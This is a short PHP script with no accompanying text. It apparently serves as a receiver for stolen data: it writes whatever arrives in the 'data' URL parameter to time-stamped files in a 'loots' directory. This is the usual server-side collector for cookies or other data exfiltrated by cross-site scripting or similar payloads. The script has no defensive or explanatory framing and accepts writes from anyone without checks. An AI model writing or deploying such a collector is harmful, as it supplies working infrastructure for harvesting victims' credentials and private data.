 <?php
$a=date("h:i:sa");

$myfile = fopen("loots/"."$a", "w") or die("Unable to open file!");
$data = $_GET['data'];
fwrite($myfile, $data);
fclose($myfile);

?> 
